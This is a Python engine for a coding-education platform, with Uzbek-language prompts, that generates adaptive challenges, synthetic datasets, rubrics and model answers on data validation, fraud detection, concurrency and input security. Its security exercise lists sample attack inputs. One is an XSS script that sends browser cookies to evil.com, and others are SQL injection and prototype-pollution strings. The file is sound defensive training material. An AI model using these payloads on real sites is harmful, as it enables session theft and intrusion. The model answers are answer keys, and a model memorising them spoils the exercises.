import json
import uuid
import random
import time
from datetime import datetime, timezone
from typing import Dict, Any, List, Optional, Tuple
from sqlalchemy.orm import Session

from app.models import User, Simulation, SimulationTask, Submission, DynamicChallenge
from app.schemas import DynamicChallengeRequest

CHALLENGE_TYPES = [
    "edge_cases",
    "high_frequency_anomalies",
    "anti_fraud",
    "concurrency",
    "zero_day_bugs",
    "stress_scale"
]

LEVEL_DEFINITIONS = {
    1: {"name": "Level 1: Foundation & Boundary Edge-Cases", "focus": "edge_cases", "base_elo": 1000, "xp": 100},
    2: {"name": "Level 2: Robust Data Validation & Guardrails", "focus": "edge_cases", "base_elo": 1150, "xp": 150},
    3: {"name": "Level 3: Real-Time Anomaly & Outlier Stream", "focus": "high_frequency_anomalies", "base_elo": 1300, "xp": 220},
    4: {"name": "Level 4: High-Frequency Windowing & Sequence Integrity", "focus": "high_frequency_anomalies", "base_elo": 1450, "xp": 300},
    5: {"name": "Level 5: Anti-Fraud Heuristics & Velocity Defense", "focus": "anti_fraud", "base_elo": 1600, "xp": 400},
    6: {"name": "Level 6: Graph AML & Coordinated Sybil Cluster Detection", "focus": "anti_fraud", "base_elo": 1750, "xp": 500},
    7: {"name": "Level 7: Concurrency & Double-Spend Race Prevention", "focus": "concurrency", "base_elo": 1900, "xp": 650},
    8: {"name": "Level 8: Distributed Lock & Deadlock-Free Ledger Sync", "focus": "concurrency", "base_elo": 2050, "xp": 800},
    9: {"name": "Level 9: Zero-Day Vulnerability & ReDoS Sanitization", "focus": "zero_day_bugs", "base_elo": 2200, "xp": 1000},
    10: {"name": "Level 10: High-Throughput Stress Scale & Fault Tolerance", "focus": "stress_scale", "base_elo": 2400, "xp": 1500},
}

class AdaptiveChallengeEngine:
    """
    Dynamic Infinite Adaptive Challenge Engine
    Talabaning joriy darajasi, oldingi yechimlari, kuchli va zaif tomonlariga qarab
    hech qachon tugamaydigan, qiyinlashib boruvchi amaliy topshiriqlar va sintetik datasetlar generatsiya qiladi.
    """

    def analyze_student_state(self, db: Session, user: User, simulation: Simulation) -> Dict[str, Any]:
        """Talabaning oldingi topshiriqlari tahlili va zaif nuqtalarini aniqlash"""
        submissions = db.query(Submission).filter(
            Submission.user_id == user.id,
            Submission.simulation_id == simulation.id
        ).order_by(Submission.created_at.desc()).limit(10).all()

        past_scores = [s.score for s in submissions if s.score is not None]
        avg_score = sum(past_scores) / len(past_scores) if past_scores else 80.0
        
        weak_spots = set()
        strengths = set()

        for s in submissions:
            fb = s.ai_feedback or {}
            mistakes = fb.get("mistakes", [])
            for m in mistakes:
                m_low = str(m).lower()
                if any(w in m_low for w in ["nolga bo'lish", "zerodivision", "manfiy", "none", "null", "chegara", "edge"]):
                    weak_spots.add("edge_cases")
                if any(w in m_low for w in ["concurrency", "poyga", "race", "lock", "async", "thread"]):
                    weak_spots.add("concurrency")
                if any(w in m_low for w in ["fraud", "firibgarlik", "security", "xavfsizlik", "sql", "injection"]):
                    weak_spots.add("anti_fraud")
                if any(w in m_low for w in ["anomaly", "outlier", "chastota", "shovqin", "burst"]):
                    weak_spots.add("high_frequency_anomalies")
                if any(w in m_low for w in ["regex", "redos", "xotira", "memory", "leak", "stress"]):
                    weak_spots.add("zero_day_bugs")

        # Hisoblangan mastery level
        current_level = user.mastery_level or 1
        if avg_score >= 85 and len(past_scores) >= 2:
            suggested_level = current_level + 1
        else:
            suggested_level = max(1, current_level)

        return {
            "current_level": current_level,
            "suggested_level": suggested_level,
            "avg_past_score": avg_score,
            "weak_spots": list(weak_spots),
            "user_elo": user.elo_rating or 1000
        }

    def generate_synthetic_dataset(self, challenge_type: str, level: int, domain: str) -> Dict[str, Any]:
        """Real va anomaliyalarga boy sintetik dataset yaratish"""
        rnd = random.Random(int(time.time() * 1000) % 1000000 + level)
        base_timestamp = int(time.time()) - 3600

        if challenge_type == "edge_cases":
            records = []
            categories = ["electronics", "apparel", "grocery", "services"]
            currencies = ["UZS", "USD", "EUR"]
            for i in range(1, 21):
                item = {
                    "id": f"rec_{i:03d}",
                    "item_name": f"Product-{rnd.choice(['Alpha', 'Beta', 'Gamma', 'Prime'])}_{i}",
                    "category": rnd.choice(categories),
                    "bid_price": round(rnd.uniform(10.0, 500.0), 2),
                    "ask_price": round(rnd.uniform(10.0, 500.0), 2),
                    "quantity": rnd.randint(1, 50),
                    "currency": rnd.choice(currencies),
                    "timestamp": base_timestamp + i * 60
                }
                # Chekka holatlarni (edge cases) sun'iy kiritish:
                if i == 4:
                    item["bid_price"] = 0.0 # Zero division trap
                elif i == 8:
                    item["ask_price"] = -15.5 # Negative price anomaly
                elif i == 12:
                    item["quantity"] = 0 # Zero quantity
                elif i == 16:
                    item["ask_price"] = None # None/Null payload
                elif i == 19:
                    item["bid_price"] = 99999999.0 # Extreme overflow bound
                records.append(item)

            return {
                "dataset_type": "market_order_book_stream",
                "total_records": len(records),
                "injected_edge_cases_count": 5,
                "injected_edge_case_indices": [4, 8, 12, 16, 19],
                "description": "20 ta moliya/savdo orderlari oqimi. 5 ta yashirin chekka xatolik (Zero, Null, Negative, Overflow) kiritilgan.",
                "data": records
            }

        elif challenge_type == "high_frequency_anomalies":
            records = []
            base_val = 100.0
            for i in range(1, 31):
                # Normal kichik o'zgarishlar
                delta = rnd.gauss(0, 1.5)
                base_val = max(10.0, base_val + delta)
                rec = {
                    "seq_id": i,
                    "sensor_id": f"node_{(i%3)+1}",
                    "metric_value": round(base_val, 3),
                    "timestamp": base_timestamp + i * 10,
                    "status_code": 200
                }
                # Anomaliyalarni kiritish
                if i == 11:
                    rec["metric_value"] = round(base_val * 6.5, 3) # Sudden burst spike (+550%)
                    rec["anomaly_label"] = "HIGH_FREQUENCY_SPIKE"
                elif i == 18:
                    rec["timestamp"] = base_timestamp + 5 * 10 # Out-of-order delayed event
                    rec["anomaly_label"] = "TIMESTAMP_OUT_OF_ORDER"
                elif i == 25:
                    rec["metric_value"] = 0.0001 # Abrupt drop to near zero
                    rec["anomaly_label"] = "DATA_BLACKOUT_DROP"
                records.append(rec)

            return {
                "dataset_type": "high_frequency_telemetry_stream",
                "total_records": len(records),
                "injected_anomalies_count": 3,
                "description": "30 ta yuqori chastotali telemetriya loglari oqimi. Vaqt siljishi va keskin amplituda anomaliyalari mavjud.",
                "data": records
            }

        elif challenge_type == "anti_fraud":
            txs = []
            ips = ["195.158.12.44", "84.54.72.10", "185.200.118.5", "10.0.0.1"]
            user_pool = [f"usr_{100+k}" for k in range(8)]
            for i in range(1, 26):
                u_id = rnd.choice(user_pool)
                t = {
                    "transaction_id": f"txn_{uuid.uuid4().hex[:8]}",
                    "sender_id": u_id,
                    "receiver_id": rnd.choice([u for u in user_pool if u != u_id]),
                    "amount_uzs": rnd.randint(10000, 2000000),
                    "ip_address": rnd.choice(ips),
                    "device_fingerprint": f"dev_fp_{rnd.randint(1, 5)}",
                    "timestamp": base_timestamp + i * 15,
                    "channel": rnd.choice(["mobile_app", "web", "pos_terminal"])
                }
                # Firibgarlik patternlarini kiritish
                if i in [14, 15, 16]: # Rapid velocity card testing (< 3 seconds between txns)
                    t["sender_id"] = "usr_compromised_99"
                    t["receiver_id"] = "usr_mule_88"
                    t["amount_uzs"] = 9950000 # Just below 10M UZS monitoring limit
                    t["ip_address"] = "185.220.101.5" # Tor exit node IP
                    t["timestamp"] = base_timestamp + 800 + (i - 14) * 2
                records = txs
                txs.append(t)

            return {
                "dataset_type": "fintech_transaction_ledger",
                "total_records": len(txs),
                "injected_fraud_patterns": [
                    "Rapid-fire velocity transactions (<2s gap)",
                    "Smurfing structuring just below 10M UZS AML threshold",
                    "Known suspicious proxy/Tor network routing"
                ],
                "data": txs
            }

        elif challenge_type == "concurrency":
            events = []
            accounts = [f"acc_uz_{k}" for k in range(1, 4)]
            initial_balances = {acc: 100000.0 for acc in accounts}
            
            # Simulyatsiya qilinadigan 15 ta parallel amaliyot
            for i in range(1, 16):
                src = rnd.choice(accounts)
                dst = rnd.choice([a for a in accounts if a != src])
                amt = rnd.choice([30000.0, 50000.0, 80000.0])
                events.append({
                    "event_id": f"evt_{i:02d}",
                    "thread_id": f"worker-{(i % 4) + 1}",
                    "operation": "TRANSFER",
                    "source_account": src,
                    "dest_account": dst,
                    "amount": amt,
                    "simulated_network_latency_ms": rnd.randint(10, 150),
                    "client_attempt_time": base_timestamp + (i // 3) * 1 # Parallel to'qnashuvlar
                })

            return {
                "dataset_type": "concurrent_balance_transfer_events",
                "initial_accounts": initial_balances,
                "concurrent_events": events,
                "description": "Bir vaqtning o'zida parallel kelib tushadigan 15 ta hisob to'lovlari. Double-spending va Race Condition sinovlari uchun.",
            }

        elif challenge_type == "zero_day_bugs":
            payloads = [
                {"id": 1, "input_string": "user_john_doe", "expected": "SAFE"},
                {"id": 2, "input_string": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!", "expected": "REDOS_VULNERABLE_REGEX_TRAP"},
                {"id": 3, "input_string": "SELECT * FROM users WHERE 1=1;", "expected": "SQL_INJECTION_SANITIZATION"},
                {"id": 4, "input_string": "<script>fetch('http://evil.com/steal?c='+document.cookie)</script>", "expected": "XSS_PAYLOAD"},
                {"id": 5, "input_string": '{"__proto__": {"admin": true}}', "expected": "PROTOTYPE_POLLUTION_ATTACK"},
                {"id": 6, "input_string": "A" * 15000, "expected": "BUFFER_OVERFLOW_MEMORY_EXHAUSTION"}
            ]
            return {
                "dataset_type": "adversarial_payload_suite",
                "payloads": payloads,
                "description": "6 ta kiber-hujum va nol-kunlik zaiflik vektorlari (ReDoS, SQLi, XSS, Prototype Pollution, Memory Exhaustion)."
            }

        else: # stress_scale
            return {
                "dataset_type": "stress_scale_workload",
                "target_qps": 50000,
                "batch_size": 1000,
                "memory_budget_mb": 64,
                "description": "50,000 QPS hajmdagi oqimni xotira limiti (64 MB) doirasida generatorlar va O(1) oqim bilan qayta ishlash testi."
            }

    def generate_challenge(
        self,
        db: Session,
        user: User,
        simulation: Simulation,
        req: Optional[DynamicChallengeRequest] = None
    ) -> DynamicChallenge:
        """
        Talaba uchun maxsus dinamik cheksiz adaptiv topshiriq generatsiya qilish
        """
        student_state = self.analyze_student_state(db, user, simulation)
        
        # Qiyinlik darajasini aniqlash
        level = req.level if (req and req.level) else student_state["suggested_level"]
        level = max(1, min(10, level))
        
        lvl_info = LEVEL_DEFINITIONS.get(level, LEVEL_DEFINITIONS[1])
        
        # Focus / Challenge Type tanlash
        if req and req.preferred_focus and req.preferred_focus in CHALLENGE_TYPES:
            challenge_type = req.preferred_focus
        elif student_state["weak_spots"]:
            # Talabaning zaif nuqtasiga qaratilgan vazifa
            challenge_type = student_state["weak_spots"][0]
        else:
            challenge_type = lvl_info["focus"]

        # Sintetik dataset tayyorlash
        dataset = self.generate_synthetic_dataset(challenge_type, level, simulation.category)
        
        # Kompaniya va mentor ohangi
        company_name = simulation.company.name if simulation.company else "Tech Enterprise"
        category = simulation.category or "Engineering"

        title, briefing, instructions, starter_code, rubric_criteria, model_ans, persona = self._build_challenge_content(
            level=level,
            challenge_type=challenge_type,
            company_name=company_name,
            category=category,
            dataset=dataset
        )

        challenge = DynamicChallenge(
            user_id=user.id,
            simulation_id=simulation.id,
            level=level,
            challenge_type=challenge_type,
            title=title,
            difficulty_label=f"Level {level} - {challenge_type.replace('_', ' ').title()}",
            briefing=briefing,
            instructions=instructions,
            synthetic_dataset=dataset,
            starter_code=starter_code,
            rubric_criteria=rubric_criteria,
            model_answer=model_ans,
            mentor_persona=persona,
            status="active",
            score=0.0
        )

        db.add(challenge)
        db.commit()
        db.refresh(challenge)
        return challenge

    def _build_challenge_content(
        self,
        level: int,
        challenge_type: str,
        company_name: str,
        category: str,
        dataset: Dict[str, Any]
    ) -> Tuple[str, str, str, str, List[Dict[str, Any]], str, str]:
        """Dinamik topshiriq matni, kodi va rubrikasini shakllantirish"""

        if challenge_type == "edge_cases":
            title = f"Adaptive Level {level}: Korporativ Data Pipeline va Chekka Xatoliklar (Edge-Cases) Himoyasi"
            briefing = (
                f"{company_name} Data & Core Engineering jamoasidan shoshilinch vazifa: "
                f"Kompaniyamizning ishlab chiqarish (production) muhitiga kelib tushayotgan moliyaviy ma'lumotlar oqimida "
                f"nolga bo'linish (ZeroDivision), None/Null qiymatlar, manfiy narxlar va kutilmagan to'lib ketish (overflow) xatolari aniqlandi. "
                f"Sizning vazifangiz — barcha chekka holatlarni (edge cases) xavfsiz bartaraf etuvchi mustahkam validator va hisoblagich algoritmini yaratishdir."
            )
            instructions = (
                "1. `process_market_records(records)` funksiyasini yozing.\n"
                "2. Har bir yozuvdagi `ask_price` va `bid_price` qiymatlarini tekshiring. Agar `ask_price <= 0` yoki `None` bo'lsa, xavfsiz defolt (0.0) qo'llang yoki istisno o'rniga xavfsiz log yozing.\n"
                "3. O'rtacha narx (mid-price) formulasi: `(bid_price + ask_price) / 2.0` bo'lib, har ikkisi ham musbat ekanligiga kafolat bering.\n"
                "4. Narxlar nisbati (ratio) `bid_price / ask_price` nolga bo'lishdan (ZeroDivisionError) qat'iy himoyalangan bo'lishi shart (`if not ask_price: return 0.0`).\n"
                "5. Qaytariladigan natija: tozalangan va hisoblangan yozuvlar ro'yxati."
            )
            starter_code = '''from typing import List, Dict, Any, Optional

def process_market_records(records: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Kompaniya ma'lumotlar oqimini chekka holatlarga (ZeroDivision, Null, Negative)
    bardoshli holda tozalash va hisoblash.
    """
    cleaned_results = []
    
    for record in records:
        bid = record.get("bid_price")
        ask = record.get("ask_price")
        qty = record.get("quantity", 0)
        
        # TODO: 1. None/Null va manfiy qiymatlardan himoyalanish
        # TODO: 2. Mid-price va Ratio hisoblashda ZeroDivisionError ga qarshi if-guard
        # TODO: 3. Cleaned dict obyektini shakllantirish
        
        pass

    return cleaned_results
'''
            rubric_criteria = [
                {"criterion": "Nolga bo'lish va None qiymatlardan (ZeroDivision/NoneGuard) to'liq himoya", "max_score": 35},
                {"criterion": "Manfiy narxlar va chekka chegaralarni to'g'ri filtrlash/normallashtirish", "max_score": 30},
                {"criterion": "Hisoblash aniqligi (Mid-price & Ratio) va toza kod arxitekturasi", "max_score": 35}
            ]
            model_ans = '''def process_market_records(records):
    cleaned = []
    for r in records:
        bid = r.get("bid_price")
        ask = r.get("ask_price")
        if bid is None or bid < 0:
            bid = 0.0
        if ask is None or ask <= 0:
            ask = 0.0
        mid_price = (bid + ask) / 2.0 if (bid > 0 and ask > 0) else 0.0
        ratio = (bid / ask) if ask > 0 else 0.0
        cleaned.append({
            "id": r.get("id"),
            "mid_price": round(mid_price, 4),
            "ratio": round(ratio, 4),
            "is_valid": bid > 0 and ask > 0
        })
    return cleaned'''
            persona = "lead_engineer"

        elif challenge_type == "high_frequency_anomalies":
            title = f"Adaptive Level {level}: Real-Time Anomaliya Aniqlash va Sliding Window Oqim Filtratsiyasi"
            briefing = (
                f"{company_name} Monitoring & Telemetriya boshqarmasidan muhim topshiriq: "
                f"Tizimimiz soniyasiga minglab signallarni qabul qiladi. Ular ichida g'ayritabiiy sakrashlar (spikes), "
                f"tarmoqdagi kechikishlar tufayli navbatdan adashgan (out-of-order) timestamp va signallar uzilishi uchramoqda. "
                f"Siz real-vaqt rejimida harakatlanuvchi oyna (Sliding Window / Z-Score) yordamida anomaliyalarni aniqlovchi modul yozishingiz kerak."
            )
            instructions = (
                "1. `AnomalyDetector` klassini yarating.\n"
                "2. `window_size` (masalan, 5 ta so'nggi element) bo'yicha harakatlanuvchi o'rtacha qiymat (moving average) va standart og'ishni (stddev) hisoblang.\n"
                "3. Agar joriy qiymat o'rtacha qiymatdan 3 barobardan ortiq farq qilsa, uni `ANOMALY_SPIKE` sifatida belgilang.\n"
                "4. Agar `timestamp` oldingi qayd qilingan oxirgi timestampdan kichik bo'lsa, `OUT_OF_ORDER` anomaliyasini qo'ying.\n"
                "5. Barcha anomaliyalarni ajratib, umumiy xulosa hisobotini qaytaring."
            )
            starter_code = '''import math
from typing import List, Dict, Any

class AnomalyDetector:
    def __init__(self, window_size: int = 5, threshold_multiplier: float = 3.0):
        self.window_size = window_size
        self.threshold = threshold_multiplier
        self.history = []
        self.last_timestamp = 0

    def ingest_record(self, record: Dict[str, Any]) -> Dict[str, Any]:
        """
        Har bir oqim elementini qabul qilib, anomaliya statusini aniqlash.
        """
        val = record.get("metric_value", 0.0)
        ts = record.get("timestamp", 0)
        is_anomaly = False
        anomaly_type = None

        # TODO: 1. Out-of-order timestamp tekshiruvi
        # TODO: 2. Moving average va stddev bo'yicha threshold tekshiruvi
        # TODO: 3. Window ro'yxatini yangilash

        return {
            "seq_id": record.get("seq_id"),
            "metric_value": val,
            "is_anomaly": is_anomaly,
            "anomaly_type": anomaly_type
        }
'''
            rubric_criteria = [
                {"criterion": "Sliding Window va Moving Average/StdDev orqali Spike aniqlash", "max_score": 40},
                {"criterion": "Out-of-Order Timestamp va ketma-ketlik buzilishini ushlash", "max_score": 30},
                {"criterion": "Oqim barqarorligi va xotira samaradorligi (O(K) oyna hajmi)", "max_score": 30}
            ]
            model_ans = '''class AnomalyDetector:
    def __init__(self, window_size=5, threshold_multiplier=3.0):
        self.window_size = window_size
        self.threshold = threshold_multiplier
        self.history = []
        self.last_ts = 0

    def ingest_record(self, record):
        val = float(record.get("metric_value", 0.0))
        ts = int(record.get("timestamp", 0))
        anomaly = None
        if self.last_ts > 0 and ts < self.last_ts:
            anomaly = "TIMESTAMP_OUT_OF_ORDER"
        self.last_ts = max(self.last_ts, ts)
        if len(self.history) >= self.window_size:
            avg = sum(self.history) / len(self.history)
            variance = sum((x - avg) ** 2 for x in self.history) / len(self.history)
            std = math.sqrt(variance)
            if std > 0 and abs(val - avg) > self.threshold * std:
                anomaly = anomaly or "HIGH_FREQUENCY_SPIKE"
        self.history.append(val)
        if len(self.history) > self.window_size:
            self.history.pop(0)
        return {"seq_id": record.get("seq_id"), "is_anomaly": anomaly is not None, "anomaly_type": anomaly}'''
            persona = "lead_engineer"

        elif challenge_type == "anti_fraud":
            title = f"Adaptive Level {level}: FinTech Anti-Fraud va Tezkor Velocity Tranzaksiya Himoyasi"
            briefing = (
                f"{company_name} Kiberxavfsizlik va Anti-Fraud departamenti direktividir: "
                f"To'lov shlyuzimizga bot-netlar va kartalarni tekshirish (card testing / smurfing) hujumlari uyushtirilmoqda. "
                f"Hujumchilar qisqa vaqt (1-3 soniya) ichida bir nechta tranzaksiya o'tkazishga va 10,000,000 UZS limitdan pastroq miqdorda "
                f"pul yuvishga urinmoqda. Siz ko'p qatlamli Anti-Fraud himoya motorini dasturlashingiz kerak."
            )
            instructions = (
                "1. `FraudEngine.evaluate_transaction(tx, history)` funksiyasini yarating.\n"
                "2. Qoidalar to'plamini kiriting:\n"
                "   - **Velocity Rule**: Agar bir xil `sender_id` dan oxirgi 5 soniya ichida 2 tadan ortiq tranzaksiya bo'lsa -> `FLAG_HIGH_VELOCITY`\n"
                "   - **Structuring Rule**: 9,500,000 UZS dan 9,999,999 UZS gacha bo'lgan tranzaksiyalarni `FLAG_AML_STRUCTURING` sifatida belgilang.\n"
                "   - **IP/Device Risk**: Agar shubhali IP yoki bir xil qurilmadan turli akkauntlar kirayotgan bo'lsa -> `FLAG_DEVICE_SPOOF`.\n"
                "3. Yakuniy Fraud Score (0-100) va harakat (`APPROVE`, `REVIEW`, `DECLINE`) qaytaring."
            )
            starter_code = '''from typing import List, Dict, Any

class FraudEngine:
    def __init__(self):
        self.aml_lower_bound = 9500000
        self.aml_upper_bound = 10000000

    def evaluate_transaction(self, tx: Dict[str, Any], user_history: List[Dict[str, Any]]) -> Dict[str, Any]:
        """
        Tranzaksiyani xatarlilik bo'yicha ko'p qatlamli baholash.
        """
        flags = []
        risk_score = 0.0

        # TODO: 1. Velocity (vaqt oralig'i) tekshiruvi
        # TODO: 2. AML chegaraviy (structuring) miqdor tahlili
        # TODO: 3. Yakuniy qaror: APPROVE (score < 40), REVIEW (40-70), DECLINE (> 70)

        decision = "APPROVE"
        return {
            "transaction_id": tx.get("transaction_id"),
            "risk_score": risk_score,
            "decision": decision,
            "triggered_flags": flags
        }
'''
            rubric_criteria = [
                {"criterion": "Velocity va tezkor tranzaksiyalar oqimini aniqlash", "max_score": 35},
                {"criterion": "AML Structuring va 10M UZS monitoring qoidasi tahlili", "max_score": 35},
                {"criterion": "Fraud Scoring shkalasi va qaror qabul qilish aniqligi (APPROVE/REVIEW/DECLINE)", "max_score": 30}
            ]
            model_ans = '''class FraudEngine:
    def evaluate_transaction(self, tx, user_history):
        flags = []
        risk = 10.0
        amt = tx.get("amount_uzs", 0)
        ts = tx.get("timestamp", 0)
        recent_txs = [h for h in user_history if (ts - h.get("timestamp", 0)) <= 5]
        if len(recent_txs) >= 2:
            flags.append("FLAG_HIGH_VELOCITY")
            risk += 45.0
        if 9500000 <= amt < 10000000:
            flags.append("FLAG_AML_STRUCTURING")
            risk += 40.0
        if "185.220" in tx.get("ip_address", ""):
            flags.append("FLAG_DEVICE_SPOOF")
            risk += 35.0
        decision = "DECLINE" if risk >= 70 else ("REVIEW" if risk >= 40 else "APPROVE")
        return {"transaction_id": tx.get("transaction_id"), "risk_score": min(100.0, risk), "decision": decision, "triggered_flags": flags}'''
            persona = "lead_engineer"

        elif challenge_type == "concurrency":
            title = f"Adaptive Level {level}: Asinxron Tranzaksiyalar va Race Condition / Mutex Himoyasi"
            briefing = (
                f"{company_name} Core Backend Arxivchilari diqqatiga: "
                f"Parallel ishlash rejimida bir nechta workerlar bitta foydalanuvchi hisobidan bir vaqtda pul yechishga harakat qilganda "
                f"Race Condition sababli Double-Spending (ikki barobar yechish) va salbiy balans holatlari yuzaga kelmoqda. "
                f"Siz asinxron `asyncio.Lock` yoki tranzaksion Mutex mexanizmidan foydalanib, atomik va xavfsiz Ledger yurituvchi modul yozishingiz zarur."
            )
            instructions = (
                "1. `AsyncBankLedger` klassini yarating.\n"
                "2. Har bir hisob raqami (`account_id`) uchun alohida yoki global `asyncio.Lock()` mexanizmini joriy qiling.\n"
                "3. `async def transfer(source, dest, amount)` metodida:\n"
                "   - Mutex orqali `source` hisobini bloklang.\n"
                "   - Balans yetarli ekanligini (`balance >= amount`) tekshiring. Yetarli bo'lmasa `False` qaytaring.\n"
                "   - Balansni yeching va `dest` hisobiga qo'shing.\n"
                "   - Deadlock (o'zaro bloklanish) bo'lmasligi uchun hisob raqamlarini tartiblab (sorted order) lock qiling.\n"
                "4. Butun parallel jarayon yakunlangach, jami mablag'lar yig'indisi (Invariant check) o'zgarmaganligini tasdiqlang."
            )
            starter_code = '''import asyncio
from typing import Dict

class AsyncBankLedger:
    def __init__(self, initial_balances: Dict[str, float]):
        self.balances = initial_balances.copy()
        self.locks: Dict[str, asyncio.Lock] = {}

    def _get_lock(self, account_id: str) -> asyncio.Lock:
        if account_id not in self.locks:
            self.locks[account_id] = asyncio.Lock()
        return self.locks[account_id]

    async def transfer(self, source: str, dest: str, amount: float) -> bool:
        """
        Ikki hisob o'rtasida poyga holatisiz (Race-Condition Free) xavfsiz o'tkazma.
        Deadlock dan saqlanish uchun locklar qat'iy tartibda olinishi zarur.
        """
        # TODO: 1. Deadlock safe lock ordering
        # TODO: 2. Balans yetarliligini tekshirish
        # TODO: 3. Atomik yangilanish
        pass
'''
            rubric_criteria = [
                {"criterion": "Asyncio Lock / Mutex orqali Race condition dan to'liq himoyalanish", "max_score": 40},
                {"criterion": "Deadlock prevention (hisoblar bo'yicha tartiblangan lock olish)", "max_score": 30},
                {"criterion": "Atomik balans yaxlitligi va Double-Spending dan kafolatlangan himoya", "max_score": 30}
            ]
            model_ans = '''class AsyncBankLedger:
    def __init__(self, initial_balances):
        self.balances = initial_balances.copy()
        self.locks = {}

    def _get_lock(self, acc):
        if acc not in self.locks:
            self.locks[acc] = asyncio.Lock()
        return self.locks[acc]

    async def transfer(self, src, dst, amount):
        first, second = (src, dst) if src < dst else (dst, src)
        async with self._get_lock(first):
            async with self._get_lock(second):
                if self.balances.get(src, 0.0) < amount:
                    return False
                self.balances[src] -= amount
                self.balances[dst] = self.balances.get(dst, 0.0) + amount
                return True'''
            persona = "lead_engineer"

        elif challenge_type == "zero_day_bugs":
            title = f"Adaptive Level {level}: Zero-Day Zaifliklar, ReDoS va Xavfsiz Kod Tahlili"
            briefing = (
                f"{company_name} Kiberxavfsizlik Bosh Muhandisligidan favqulodda xabar: "
                f"Tizimimizga kiritilayotgan ma'lumotlar orqali ReDoS (Regulyar ifodalar orqali CPU ni 100% yuklash), "
                f"SQL Injection payloadlari va xotirani to'ldirib yuborish (Memory exhaustion) hujumlari uyushtirilmoqda. "
                f"Siz kiruvchi barcha xom satrlarni tozalovchi va xavfsiz qayta ishlovchi Sanitize & Validator qatlamini yaratishingiz lozim."
            )
            instructions = (
                "1. `InputSecurityGuard` klassini yozing.\n"
                "2. `validate_string(s)` metodida:\n"
                "   - Uzunlik chegarasini (masalan, max 2048 belgi) tekshiring.\n"
                "   - Falokatli orqaga qaytish (Catastrophic Backtracking / ReDoS) ga moyil bo'lmagan xavfsiz Regex qo'llang.\n"
                "   - SQL kalit so'zlari (`SELECT`, `UNION`, `DROP`, `' OR '1'='1`) va script teglarni filtrlang yoki xavfsiz escape qiling.\n"
                "3. Xavfli satrlar uchun xavfsiz status qaytaring va CPU resursini tejashni ta'minlang."
            )
            starter_code = r'''import re
import html
from typing import Dict, Any

class InputSecurityGuard:
    def __init__(self, max_len: int = 2048):
        self.max_len = max_len
        self.sql_injection_pattern = re.compile(r"(\b(UNION|SELECT|DROP|INSERT|DELETE|UPDATE)\b|--|\bOR\b\s+['\d\w]+)", re.IGNORECASE)

    def sanitize_and_check(self, raw_input: str) -> Dict[str, Any]:
        """
        Nol-kunlik zaifliklar va payloadlarni zararsizlantirish.
        """
        # TODO: 1. Max length check (Memory overflow guard)
        # TODO: 2. SQL injection pattern detection
        # TODO: 3. XSS HTML escape
        pass
'''
            rubric_criteria = [
                {"criterion": "SQL Injection va XSS xavfli payloadlarini aniqlash va zararsizlantirish", "max_score": 40},
                {"criterion": "ReDoS va Memory Exhaustion ga qarshi xavfsiz chegaralash", "max_score": 35},
                {"criterion": "Toza sanitization arxitekturasi va xavfsiz javob strukturalari", "max_score": 25}
            ]
            model_ans = r'''class InputSecurityGuard:
    def __init__(self, max_len=2048):
        self.max_len = max_len
        self.sql_pattern = re.compile(r"(\b(UNION|SELECT|DROP|INSERT|DELETE|UPDATE)\b|--|\bOR\b\s+['\d\w]+)", re.IGNORECASE)

    def sanitize_and_check(self, raw_input):
        if not raw_input:
            return {"is_safe": True, "clean_str": "", "threat": None}
        if len(raw_input) > self.max_len:
            return {"is_safe": False, "clean_str": raw_input[:self.max_len], "threat": "BUFFER_OVERFLOW_MEMORY_EXHAUSTION"}
        if self.sql_pattern.search(raw_input):
            return {"is_safe": False, "clean_str": html.escape(raw_input), "threat": "SQL_INJECTION"}
        if "<script" in raw_input.lower():
            return {"is_safe": False, "clean_str": html.escape(raw_input), "threat": "XSS_PAYLOAD"}
        return {"is_safe": True, "clean_str": html.escape(raw_input), "threat": None}'''
            persona = "lead_engineer"

        else: # stress_scale
            title = f"Adaptive Level {level}: Yuqori Yuklama (50k QPS) va Xotira Tejamkorligi (O(1) Streaming)"
            briefing = (
                f"{company_name} High-Load Performance jamoasi talabi: "
                f"Tizimimizga soniyasiga 50,000 ta tranzaksiya oqimi keladi. Uni xotiraga bittalab to'plab list() qilish "
                f"Out-Of-Memory (OOM) xatosiga olib keladi. Siz xotira chegarasini (64 MB) buzmagan holda "
                f"Generatorlar (yield) va O(1) xotira yordamida oqimni batch holida aggregatsiya qiluvchi modul yaratishingiz kerak."
            )
            instructions = (
                "1. `stream_batch_processor(data_stream, batch_size=100)` generator funksiyasini yozing.\n"
                "2. Har bir batch bo'yicha umumiy summa va o'rtacha qiymatni hisoblab `yield` qiling.\n"
                "3. Butun oqimni xotirada to'liq saqlamang, faqat joriy batch hajmida O(1) doimiy xotira sarflansin."
            )
            starter_code = '''from typing import Iterable, Dict, Any, Generator

def stream_batch_processor(data_stream: Iterable[Dict[str, Any]], batch_size: int = 100) -> Generator[Dict[str, Any], None, None]:
    """
    O(1) xotira sarfi bilan katta oqimni paketlab (batching) qayta ishlash.
    """
    # TODO: Generator yield orqali xotirani tejash
    pass
'''
            rubric_criteria = [
                {"criterion": "Generator va O(1) xotira sarfi orqali OOM xatosidan saqlanish", "max_score": 50},
                {"criterion": "Batch aggregatsiya aniqligi va yuqori hisoblash unumdorligi", "max_score": 50}
            ]
            model_ans = '''def stream_batch_processor(data_stream, batch_size=100):
    batch = []
    for item in data_stream:
        batch.append(item)
        if len(batch) >= batch_size:
            total = sum(x.get("amount", 0) for x in batch)
            yield {"batch_size": len(batch), "total_amount": total, "avg": total / len(batch)}
            batch.clear()
    if batch:
        total = sum(x.get("amount", 0) for x in batch)
        yield {"batch_size": len(batch), "total_amount": total, "avg": total / len(batch)}'''
            persona = "lead_engineer"

        return title, briefing, instructions, starter_code, rubric_criteria, model_ans, persona

adaptive_challenge_engine = AdaptiveChallengeEngine()
